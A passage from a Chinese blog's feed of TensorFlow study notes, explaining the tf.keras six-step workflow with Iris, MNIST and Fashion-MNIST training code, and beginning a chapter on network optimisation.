<p>行百里者半九十，况且我还只是刚刚开始，更加不能松懈。接下来要时时复习所学知识，巩固基础。并不断学习更加深入的知识，有选择的与实践项目结合。同时对python的学习也不能落下，对用到的第三方库要进行整理。</p>
]]></content>
      <categories>
        <category>【-基础知识-】人工智能</category>
        <category>TensorFlow实践</category>
      </categories>
      <tags>
        <tag>机器学习</tag>
      </tags>
  </entry>
  <entry>
    <title>TensorFlow笔记-ch3 神经网络八股</title>
    <url>/2023/05/01/TensorFlow%E7%AC%94%E8%AE%B0-ch3%20%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C%E5%85%AB%E8%82%A1/</url>
    <content><![CDATA[<h1 id="tf-keras-搭建网络八股"><a href="#tf-keras-搭建网络八股" class="headerlink" title="tf.keras 搭建网络八股"></a>tf.keras 搭建网络八股</h1><h2 id="keras介绍"><a href="#keras介绍" class="headerlink" title="keras介绍"></a>keras介绍</h2><blockquote>
<p>tf.keras 是 tensorflow2 引入的<strong>高封装度的框架</strong>，可以用于快速搭建神经网络模型，keras 为支持快速实验而生，能够把想法迅速转换为结果，是深度学习框架之中最终易上手的一个，它提供了一致而简洁的 API，能够极大地减少一般应用下的工作量，提高代码地封装程度和复用性。</p>
</blockquote>
<p>深度学习编程框架中的 API 众多，就算是从业很久的算法工程师也不可能记住所有的 API。由于本课程时间有限，只覆盖了 tensorflow2 系列中的<strong>最常用的几个 API</strong>，仍然还有很多需要在今后的实践中继续学习，这时我们就需要参考tensorflow 的官方文档，通过<strong>阅读源码和注释</strong>的方法学习 API。<br>通常有两种方法，以下将分别介绍:</p>
<blockquote>
<p>第一种方法： pycharm 集成开发环境中查看框架源码</p>
</blockquote>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1649074887389.png" alt="Pycharm"></p>
<p>如上图，将鼠标放置在函数上按住 Ctrl 键，会显示函数的基本信息，包括封装函数的类，函数入口参数，函数功能等。<br>按住 Ctrl 键点击函数会跳转到函数的源代码部分，使用者可以根据源码和注释进一步了解函数的实现方法。</p>
<blockquote>
<p>在 tensorflow 官网中查询函数文档</p>
<blockquote>
<p>附上官网网址：<a href="https://tensorflow.google.cn/api_docs/python/tf/keras/Model#fit">https://tensorflow.google.cn/api_docs&#x2F;python&#x2F;tf&#x2F;keras&#x2F;Model#fit</a></p>
</blockquote>
</blockquote>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1649074887405.png" alt="官网查看"></p>
<p>在左侧选择想要查看的API即可。</p>
<h2 id="搭建神经网络六部法"><a href="#搭建神经网络六部法" class="headerlink" title="搭建神经网络六部法"></a>搭建神经网络六部法</h2><blockquote>
<p>六部格式，定下神经网络训练的基本框架</p>
</blockquote>
<ul>
<li>第一步：<strong>import 相关模块</strong>，如 import tensorflow as tf。</li>
<li>第二步：<strong>指定输入网络的训练集和测试集</strong>，如指定训练集的输入 x_train 和标签y_train，测试集的输入 x_test 和标签 y_test。(要使得数据格式符合神经网络的输入格式)</li>
<li>第三步：逐层<strong>搭建网络结构</strong>，<code>model = tf.keras.models.Sequential()</code></li>
<li>第四步：在<code> model.compile()</code>中配置<strong>训练方法</strong>，选择训练时使用的<strong>优化器</strong>、<strong>损失函数</strong>和最终<strong>评价指标</strong>。</li>
<li>第五步：在 <code>model.fit()</code>中执行训练过程，告知训练集和测试集的<strong>输入值</strong>和<strong>标签</strong>、每个 <strong>batch 的大小</strong>（batchsize）和<strong>数据集的迭代次数</strong>（epoch）。</li>
<li>第六步：使用 <code>model.summary()</code>打印网络结构，统计参数数目。</li>
</ul>
<h3 id="各个函数用法介绍"><a href="#各个函数用法介绍" class="headerlink" title="各个函数用法介绍"></a>各个函数用法介绍</h3><blockquote>
<p>tf.keras.models.Sequential()</p>
</blockquote>
<p>Sequential 函数是一个<strong>容器</strong>，描述了神经网络的网络结构，在 Sequential函数的输入参数中描述从输入层到输出层的网络结构。可以在其中定义激活函数、正则化等。</p>
<ul>
<li><p>拉直层：<code>tf.keras.layers.Flatten()</code><br>拉直层可以变换张量的尺寸，把输入特征拉直为一维数组，是不含计算参数的层。</p>
</li>
<li><p>全连接层：<code>tf.keras.layers.Dense</code>( 神经元个数,activation&#x3D;”激活函数”,kernel_regularizer&#x3D;”正则化方式”)</p>
<p>   其中：<br>activation（字符串给出）可选<code> relu</code>、<code>softmax</code>、<code>sigmoid</code>、<code>tanh</code> 等<br>kernel_regularizer 可选 <code>tf.keras.regularizers.l1()</code>、<code>tf.keras.regularizers.l2()</code></p>
</li>
<li><p>卷积层：<code>tf.keras.layers.Conv2D</code>( filter &#x3D; <strong>卷积核个数</strong>, kernel_size &#x3D; <strong>卷积核尺寸</strong>,strides &#x3D; <strong>卷积步长</strong>,padding &#x3D; “valid” or “same”)</p>
</li>
<li><p>LSTM 层：tf.keras.layers.LSTM()。</p>
</li>
</ul>
<hr>
<blockquote>
<p>Model.compile( optimizer &#x3D; 优化器, loss &#x3D; 损失函数, metrics &#x3D; [“准确率”])</p>
</blockquote>
<p>Compile 用于配置神经网络的训练方法，告知训练时使用的<strong>优化器</strong>、<strong>损失函数</strong>和<strong>准确率评测标准</strong>。</p>
<ol>
<li>optimizer 可以是<strong>字符串形式</strong>给出的优化器名字，也可以是函数形式，使用函数形式可以设置学习率、动量和超参数。</li>
</ol>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1649074887378.png" alt="optimizer"></p>
<p>注：前期建议使用字符串形式，后面再使用函数设置学习率。<br>       更多optimizer的调用可以去官方文档：tf.keras下的Model查看。</p>
<ol start="2">
<li>Loss 可以是字符串形式给出的损失函数的名字，也可以是函数形式。</li>
</ol>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1649074887386.png" alt="Loss可选性"></p>
<p>注：损失函数常需要经过 softmax 等函数将输出转化为概率分布的形式。from_logits 则用来标注该损失函数是否需要转换为概率的形式，<strong>取 False 时表示转化为概率分布，取 True 时表示没有转化为概率分布</strong>，直接输出。</p>
<ol start="3">
<li>Metrics 标注网络评测指标。</li>
</ol>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1649074887407.png" alt="Metrics可选项"></p>
<p>注：我们这里选择第三个，即y为概率分布，y_为数值。</p>
<hr>
<blockquote>
<p>model.fit()</p>
<blockquote>
<p>训练集的输入特征， 训练集的标签， batch_size, epochs,<br>validation_data &#x3D; (测试集的输入特征，测试集的标签)，<br>validataion_split &#x3D; 从训练集划分多少比例给测试集，<br>validation_freq &#x3D; 测试的 epoch 间隔次数</p>
</blockquote>
</blockquote>
<p>fit 函数用于执行训练过程。</p>
<hr>
<blockquote>
<p>model.summary()</p>
</blockquote>
<p>summary 函数用于打印<strong>网络结构</strong>和<strong>参数统计</strong>。</p>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1649074887406.png"></p>
<p>上图是 model.summary()对鸢尾花分类网络的网络结构和参数统计，对于一个输入为 4 输出为 3 的全连接网络，共有 15 个参数。</p>
<h2 id="iris-数据集代码复现"><a href="#iris-数据集代码复现" class="headerlink" title="iris 数据集代码复现"></a>iris 数据集代码复现</h2><p>先给出<strong>简化后的代码</strong>：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> tensorflow <span class="keyword">as</span> tf</span><br><span class="line"><span class="keyword">from</span> sklearn <span class="keyword">import</span> datasets</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line">x_train = datasets.load_iris().data</span><br><span class="line">y_train = datasets.load_iris().target</span><br><span class="line"></span><br><span class="line">np.random.seed(<span class="number">116</span>)</span><br><span class="line">np.random.shuffle(x_train)</span><br><span class="line">np.random.seed(<span class="number">116</span>)</span><br><span class="line">np.random.shuffle(y_train)</span><br><span class="line">tf.random.set_seed(<span class="number">116</span>)</span><br><span class="line"></span><br><span class="line">model = tf.keras.models.Sequential([</span><br><span class="line">    tf.keras.layers.Dense(<span class="number">3</span>, activation=<span class="string">&#x27;softmax&#x27;</span>, kernel_regularizer=tf.keras.regularizers.l2())</span><br><span class="line">])</span><br><span class="line"></span><br><span class="line">model.<span class="built_in">compile</span>(optimizer=tf.keras.optimizers.SGD(lr=<span class="number">0.1</span>),</span><br><span class="line">              loss=tf.keras.losses.SparseCategoricalCrossentropy(from_logits=<span class="literal">False</span>),</span><br><span class="line">              metrics=[<span class="string">&#x27;sparse_categorical_accuracy&#x27;</span>])</span><br><span class="line"></span><br><span class="line">model.fit(x_train, y_train, batch_size=<span class="number">32</span>, epochs=<span class="number">500</span>, validation_split=<span class="number">0.2</span>, validation_freq=<span class="number">20</span>)</span><br><span class="line"></span><br><span class="line">model.summary()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>空间，使用tf.keras后，原本上百行的代码只需要24行。究其原因，在于tf.keras将原本很复杂的底层代码封装成了一个个接口函数，而我们只需要填上对应的参数即可。</p>
<blockquote>
<p>下面我们具体分析一下上代码，将六部法套入其中：</p>
</blockquote>
<p><strong>第一步：import 相关模块：</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> tensorflow <span class="keyword">as</span> tf</span><br><span class="line"><span class="keyword">from</span> sklearn <span class="keyword">import</span> datasets</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br></pre></td></tr></table></figure>
<hr>
<p><strong>第二步：指定输入网络地训练集和测试集：</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">x_train = datasets.load_iris().data</span><br><span class="line">y_train = datasets.load_iris().target</span><br></pre></td></tr></table></figure>
<p>其中测试集的输入特征 x_test 和标签 y_test 可以像 x_train 和 y_train 一样直接从数据集获取，也可以如上述在 fit 中按比例从训练集中划分，本例选择从训练集中划分，所以只需加载 x_train，y_train 即可。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">np.random.seed(<span class="number">116</span>)</span><br><span class="line">np.random.shuffle(x_train)</span><br><span class="line">np.random.seed(<span class="number">116</span>)</span><br><span class="line">np.random.shuffle(y_train)</span><br><span class="line">tf.random.set_seed(<span class="number">116</span>)</span><br></pre></td></tr></table></figure>
<p>以上代码实现了数据集的乱序。</p>
<hr>
<p><strong>第三步：逐层搭建网络结构：</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">model = tf.keras.models.Sequential([</span><br><span class="line">    tf.keras.layers.Dense(<span class="number">3</span>, activation=<span class="string">&#x27;softmax&#x27;</span>, kernel_regularizer=tf.keras.regularizers.l2())</span><br><span class="line">])</span><br></pre></td></tr></table></figure>
<p>如上所示，本例使用了<strong>单层全连接网络</strong>，第一个参数表示神经元个数，第二个参数表示网络所使用的激活函数，第三个参数表示选用的正则化方法。</p>
<p>使用 Sequential 可以快速搭建网络结构，但是如果网络包含跳连等其他复杂网络结构，Sequential 就无法表示了。这就需要使用 <strong>class</strong> 来声明网络结构。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">MyModel</span>(<span class="title class_ inherited__">Model</span>):</span><br><span class="line">			  <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">							<span class="built_in">super</span>(MyModel, self).__init__()</span><br><span class="line"> 							//初始化网络结构</span><br><span class="line">			  <span class="keyword">def</span> <span class="title function_">call</span>(<span class="params">self, x</span>):</span><br><span class="line">							y = self.d1(x)</span><br><span class="line">							<span class="keyword">return</span> y</span><br></pre></td></tr></table></figure>
<p>使用 <strong>class 类</strong>封装网络结构，如上所示是一个 <strong>class 模板</strong>，<code>MyModel </code>表示声明的神经网络的名字，括号中的<code>Model</code>表示创建的类需要继承 tensorflow 库中的 Model 类。类中需要定义<strong>两个函数</strong>，<code>__ init__()</code>函数为类的构造函数,用于初始化类的参数，<code>spuer(MyModel,self).__ init__()</code>这行表示<strong>初始化父类的参数</strong>。之后便可初始化网络结构,搭建出神经网络所需的各种网络结构块。<code>call()</code>函数中调用<code>__init__()</code>函数中完成初始化的网络块，实现前向传播并返回推理值。<br>使用 class 方式搭建鸢尾花网络结构的代码如下所示。</p>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1649074887408.png" alt="class-鸢尾花"></p>
<p>搭建好网络结构后只需要使用 Model&#x3D;MyModel()构建类的对象，就可以使用该模型了。</p>
<p>下面给出使用class类搭建鸢尾花数据集的神经网络：</p>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1649074887392.png" alt="class"></p>
<p>下面给出源码：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> tensorflow <span class="keyword">as</span> tf</span><br><span class="line"><span class="comment">###########################################</span></span><br><span class="line"><span class="keyword">from</span> tensorflow.keras.layers <span class="keyword">import</span> Dense</span><br><span class="line"><span class="keyword">from</span> tensorflow.keras <span class="keyword">import</span> Model</span><br><span class="line"><span class="comment">###########################################</span></span><br><span class="line"><span class="keyword">from</span> sklearn <span class="keyword">import</span> datasets</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line">x_train = datasets.load_iris().data</span><br><span class="line">y_train = datasets.load_iris().target</span><br><span class="line"></span><br><span class="line">np.random.seed(<span class="number">116</span>)</span><br><span class="line">np.random.shuffle(x_train)</span><br><span class="line">np.random.seed(<span class="number">116</span>)</span><br><span class="line">np.random.shuffle(y_train)</span><br><span class="line">tf.random.set_seed(<span class="number">116</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">##################################################</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">IrisModel</span>(<span class="title class_ inherited__">Model</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">super</span>(IrisModel, self).__init__()</span><br><span class="line">        self.d1 = Dense(<span class="number">3</span>, activation=<span class="string">&#x27;softmax&#x27;</span>, kernel_regularizer=tf.keras.regularizers.l2())</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">call</span>(<span class="params">self, x</span>):</span><br><span class="line">        y = self.d1(x)</span><br><span class="line">        <span class="keyword">return</span> y</span><br><span class="line"></span><br><span class="line">model = IrisModel()</span><br><span class="line"><span class="comment">#################################################</span></span><br><span class="line"></span><br><span class="line">model.<span class="built_in">compile</span>(optimizer=tf.keras.optimizers.SGD(lr=<span class="number">0.1</span>),</span><br><span class="line">              loss=tf.keras.losses.SparseCategoricalCrossentropy(from_logits=<span class="literal">False</span>),</span><br><span class="line">              metrics=[<span class="string">&#x27;sparse_categorical_accuracy&#x27;</span>])</span><br><span class="line"></span><br><span class="line">model.fit(x_train, y_train, batch_size=<span class="number">32</span>, epochs=<span class="number">500</span>, validation_split=<span class="number">0.2</span>, validation_freq=<span class="number">20</span>)</span><br><span class="line">model.summary()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>注： 和原本的代码相比，改变的地方在代码中标出。<br>①import 中添加了 Model 模块和 Dense 层、Flatten 层。<br>②使用 class 声明网络结构，model &#x3D; IrisModel()初始化模型对象。</p>
<hr>
<p><strong>第四步：在 model.compile()中配置训练方法：</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">model.<span class="built_in">compile</span>(optimizer=tf.keras.optimizers.SGD(lr=<span class="number">0.1</span>),</span><br><span class="line">              loss=tf.keras.losses.SparseCategoricalCrossentropy(from_logits=<span class="literal">False</span>),</span><br><span class="line">              metrics=[<span class="string">&#x27;sparse_categorical_accuracy&#x27;</span>])</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>如上所示，本例使用 <strong>SGD 优化器</strong>，并将<strong>学习率设置为 0.1</strong> ，选择<code>SparseCategoricalCrossentrop </code>作为损失函数。由于神经网络输出使用了softmax 激活函数，使得输出是概率分布，而不是原始输出，所以需要将<br><strong>from_logits 参数设置为 False</strong>。鸢尾花数据集给的标签是 0，1，2 这样的数值，而网络前向传播的输出为 概率分布，所以 metrics 需要设置为	<code>sparse_categorical_accuracy</code>。</p>
<hr>
<p><strong>第五步：在 model.fit()中执行训练过程:</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">model.fit(x_train, y_train, batch_size=<span class="number">32</span>, epochs=<span class="number">500</span>, validation_split=<span class="number">0.2</span>, validation_freq=<span class="number">20</span>)</span><br></pre></td></tr></table></figure>
<p>在 fit 中执行训练过程,x_train,y_train 分别表示网络的输入特征和标签，batch_size 表示一次喂入神经网络的数据量，epochs 表示数据集的迭代次数,validation_split 表示数据集中测试集的划分比例，validation_freq 表示每迭<br>代 20 次在测试集上测试一次准确率。</p>
<hr>
<p><strong>第六步：使用 model.summary()打印网络结构，统计参数数目：</strong></p>
<p><code>model.summary()</code></p>
<h1 id="实例：MNIST数据集"><a href="#实例：MNIST数据集" class="headerlink" title="实例：MNIST数据集"></a>实例：MNIST数据集</h1><blockquote>
<p>MNIST是一个入门的手写数字识别的数据集。</p>
</blockquote>
<h2 id="MNIST数据集的介绍"><a href="#MNIST数据集的介绍" class="headerlink" title="MNIST数据集的介绍"></a>MNIST数据集的介绍</h2><p>MNIST 数据集一共有 7 万张图片，是 <strong>28×28 像素</strong>的 0 到 9 <strong>手写数字数据集</strong>，其中 6 万张用于训练，1 万张用于测试。每张图片包括 <strong>784（28×28）</strong> 个像素点，使用全连接网络时可将 <strong>784 个像素点</strong>组成长度为 784 的一维数组，作为输入特征。数据集图片如下所示。</p>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1649074887388.png" alt="MNIST数据集"></p>
<blockquote>
<p>数据集的导入：</p>
</blockquote>
<p>keras 函数库中提供了使用 <strong>mnist 数据集的接口</strong>，代码如下所示，可以使用load_data()直接从 mnist 中读取测试集和训练集。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">mnist = tf.keras.datasets.mnist</span><br><span class="line">(x_train, y_train), (x_test, y_test) = mnist.load_data()</span><br></pre></td></tr></table></figure>
<p>注：这里已经导入了测试数据。</p>
<hr>
<blockquote>
<p>以二位数组的形式打印出来</p>
</blockquote>
<p><strong>使用代码</strong>：<code>print(&quot;x_train.shape:\n&quot;, x_train.shape)</code></p>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1649074887401.png" alt="二维数组"></p>
<p>上述代码将读取的x_train的第一层打印出来，是一个28x28的二维数组。<br>对比矩阵图和PIL得到的图，可以知道在MNIST数据集里是使用灰度值表示具体的数字。</p>
<p>注：在MNIST里，0为黑色，255位白色，介于二者之间的呈现不同的颜色。以数值表示颜色的深浅就是灰度值。</p>
<hr>
<blockquote>
<p>MNIST数据集其它部分的shape</p>
</blockquote>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1649074887390.png" alt="shape"></p>
<p>这里我们可以看到，x都是三维矩阵，分别为60000和10000个图片像素矩阵。<br>而y都是一维数组，每一个表示x图片代表的正确数字，是以数值的形式给出。</p>
<hr>
<h2 id="使用六部法训练MNIST数据集"><a href="#使用六部法训练MNIST数据集" class="headerlink" title="使用六部法训练MNIST数据集"></a>使用六部法训练MNIST数据集</h2><p><strong>先来给出源码</strong>：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> tensorflow <span class="keyword">as</span> tf</span><br><span class="line"></span><br><span class="line">mnist = tf.keras.datasets.mnist</span><br><span class="line">(x_train, y_train), (x_test, y_test) = mnist.load_data()</span><br><span class="line">x_train, x_test = x_train / <span class="number">255.0</span>, x_test / <span class="number">255.0</span></span><br><span class="line"></span><br><span class="line">model = tf.keras.models.Sequential([</span><br><span class="line">    tf.keras.layers.Flatten(),</span><br><span class="line">    tf.keras.layers.Dense(<span class="number">128</span>, activation=<span class="string">&#x27;relu&#x27;</span>),</span><br><span class="line">    tf.keras.layers.Dense(<span class="number">10</span>, activation=<span class="string">&#x27;softmax&#x27;</span>)</span><br><span class="line">])</span><br><span class="line"></span><br><span class="line">model.<span class="built_in">compile</span>(optimizer=<span class="string">&#x27;adam&#x27;</span>,</span><br><span class="line">              loss=tf.keras.losses.SparseCategoricalCrossentropy(from_logits=<span class="literal">False</span>),</span><br><span class="line">              metrics=[<span class="string">&#x27;sparse_categorical_accuracy&#x27;</span>])</span><br><span class="line"></span><br><span class="line">model.fit(x_train, y_train, batch_size=<span class="number">32</span>, epochs=<span class="number">5</span>, validation_data=(x_test, y_test), validation_freq=<span class="number">1</span>)</span><br><span class="line">model.summary()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><strong>运行结果</strong>：</p>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1649074887391.png" alt="result"></p>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1649074887402.png" alt="六部法"></p>
<hr>
<blockquote>
<p>使用class定义模型：</p>
</blockquote>
<p>代码如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> tensorflow <span class="keyword">as</span> tf</span><br><span class="line"><span class="keyword">from</span> tensorflow.keras.layers <span class="keyword">import</span> Dense, Flatten</span><br><span class="line"><span class="keyword">from</span> tensorflow.keras <span class="keyword">import</span> Model</span><br><span class="line"></span><br><span class="line">mnist = tf.keras.datasets.mnist</span><br><span class="line">(x_train, y_train), (x_test, y_test) = mnist.load_data()</span><br><span class="line">x_train, x_test = x_train / <span class="number">255.0</span>, x_test / <span class="number">255.0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MnistModel</span>(<span class="title class_ inherited__">Model</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">super</span>(MnistModel, self).__init__()</span><br><span class="line">        self.flatten = Flatten()</span><br><span class="line">        self.d1 = Dense(<span class="number">128</span>, activation=<span class="string">&#x27;relu&#x27;</span>)</span><br><span class="line">        self.d2 = Dense(<span class="number">10</span>, activation=<span class="string">&#x27;softmax&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">call</span>(<span class="params">self, x</span>):</span><br><span class="line">        x = self.flatten(x)</span><br><span class="line">        x = self.d1(x)</span><br><span class="line">        y = self.d2(x)</span><br><span class="line">        <span class="keyword">return</span> y</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">model = MnistModel()</span><br><span class="line"></span><br><span class="line">model.<span class="built_in">compile</span>(optimizer=<span class="string">&#x27;adam&#x27;</span>,</span><br><span class="line">              loss=tf.keras.losses.SparseCategoricalCrossentropy(from_logits=<span class="literal">False</span>),</span><br><span class="line">              metrics=[<span class="string">&#x27;sparse_categorical_accuracy&#x27;</span>])</span><br><span class="line"></span><br><span class="line">model.fit(x_train, y_train, batch_size=<span class="number">32</span>, epochs=<span class="number">5</span>, validation_data=(x_test, y_test), validation_freq=<span class="number">1</span>)</span><br><span class="line">model.summary()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>注：与源代码相比，变化的地方只是模型建立区域和开头导入的几个模块。<br><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1649074887404.png" alt="model"></p>
<hr>
<blockquote>
<p>注意事项：</p>
</blockquote>
<p>我们这里在导入数据集后进行了归一化，也就是同除255得到[0,1]的数据，利于模型的训练。<br>同时我们在实际进行手写输入的识别时除了要进行矩阵的变换之外，还要进行归一化处理。</p>
<p>MNIST数据集的图片是黑底白字，所以实际测试时也要是这个样式。</p>
<h1 id="实践二：Fashion-mnist-数据集"><a href="#实践二：Fashion-mnist-数据集" class="headerlink" title="实践二：Fashion_mnist 数据集"></a>实践二：Fashion_mnist 数据集</h1><p>Fashion_mnist 数据集具有 mnist 近乎所有的特征，包括 60000 张训练图片和 10000 张测试图片，图片被分为十类，每张图像为 28×28 的分辨率。</p>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1649074887403.png" alt="数据集类别"></p>
<p>图片的示例：<br><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1649074887409.png" alt="数据集图片"></p>
<p>代码实例：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> tensorflow <span class="keyword">as</span> tf</span><br><span class="line"></span><br><span class="line">fashion = tf.keras.datasets.fashion_mnist</span><br><span class="line">(x_train, y_train), (x_test, y_test) = fashion.load_data()</span><br><span class="line">x_train, x_test = x_train/<span class="number">255</span>, x_test/<span class="number">255</span></span><br><span class="line"></span><br><span class="line">model = tf.keras.models.Sequential([</span><br><span class="line">    tf.keras.layers.Flatten(),</span><br><span class="line">    tf.keras.layers.Dense(<span class="number">128</span>, activation=<span class="string">&#x27;relu&#x27;</span>),</span><br><span class="line">    tf.keras.layers.Dense(<span class="number">10</span>, activation=<span class="string">&#x27;softmax&#x27;</span>)</span><br><span class="line">])</span><br><span class="line"></span><br><span class="line">model.<span class="built_in">compile</span>(</span><br><span class="line">    optimizer=<span class="string">&#x27;adam&#x27;</span>,</span><br><span class="line">    loss=tf.keras.losses.SparseCategoricalCrossentropy(from_logits=<span class="literal">False</span>),</span><br><span class="line">    metrics=[<span class="string">&#x27;sparse_categorical_accuracy&#x27;</span>]</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">model.fit(x_train, y_train, batch_size=<span class="number">32</span>, epochs=<span class="number">5</span>, validation_data=(x_test, y_test), validation_freq=<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">model.summery()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<hr>
<blockquote>
<p>写在最后：</p>
</blockquote>
<p>到此，本篇内容已经学习完毕，最重要的收获就是通过tf.keras进行神经网络的构建与训练，有了前面的基础，这里就可以直接调用API了，也可以理解调用的背后具体的过程了，对于API给定的一个个参数也知道了是什么含义。</p>
<p>这只是最简单的神经网络的学习，却是以后学习的根基，毕竟构建神经网络的六部法是不会变的，适用于以后的所有实践，只是更加细化。</p>
]]></content>
      <categories>
        <category>【-基础知识-】人工智能</category>
        <category>TensorFlow实践</category>
      </categories>
      <tags>
        <tag>机器学习</tag>
      </tags>
  </entry>
  <entry>
    <title>TenforFlow笔记--ch2 神经网络优化</title>
    <url>/2023/05/01/TenforFlow%E7%AC%94%E8%AE%B0--ch2%20%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C%E4%BC%98%E5%8C%96/</url>
    <content><![CDATA[<blockquote>
<p>本讲目标：学会神经网络优化过程，使用正则化减少过拟合，使用优化器更新网络参数。</p>
</blockquote>
<h1 id="预备知识"><a href="#预备知识" class="headerlink" title="预备知识"></a>预备知识</h1><blockquote>
<p>在正式学习前，我们需要先来了解一下使用到的函数，扫清代码关。</p>
<blockquote>
<p>关注代码的注释，为学习注意点。</p>
</blockquote>
</blockquote>
<h2 id="函数1：tf-where"><a href="#函数1：tf-where" class="headerlink" title="函数1：tf.where()"></a>函数1：tf.where()</h2><p><strong>代码格式</strong>：<code>tf.where(条件语句，真返回A，假返回B)</code><br><strong>函数作用</strong>：条件语句真返回A，条件语句假返回B<br><strong>示例</strong>：<br><img src="https://gitee.com/qidangge/picgo/raw/master/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1642486765236.png" alt="eg"></p>
<h2 id="函数2：np-random-RandomState-rand"><a href="#函数2：np-random-RandomState-rand" class="headerlink" title="函数2：np.random.RandomState.rand()"></a>函数2：np.random.RandomState.rand()</h2><p><strong>代码格式</strong>：<code>np.random.RandomState.rand(维度)</code>  #维度为空，返回标量<br><strong>函数作用</strong>： 返回一个[0,1) 之间的随机数</p>
<p><strong>示例</strong>：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 导入模块--&gt;设置种子--&gt; 生成变量（是否给出参数）</span></span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line">rdm=np.random.RandomState(seed=<span class="number">1</span>) <span class="comment">#seed=常数每次生成随机数相同</span></span><br><span class="line">a=rdm.rand() <span class="comment"># 返回一个随机标量</span></span><br><span class="line">b=rdm.rand(<span class="number">2</span>,<span class="number">3</span>) <span class="comment"># 返回维度为2行3列随机数矩阵</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;a:&quot;</span>,a)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;b:&quot;</span>,b)</span><br></pre></td></tr></table></figure>
<p><strong>运行结果</strong>：<br><img src="https://gitee.com/qidangge/picgo/raw/master/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1642487149832.png" alt="result"></p>
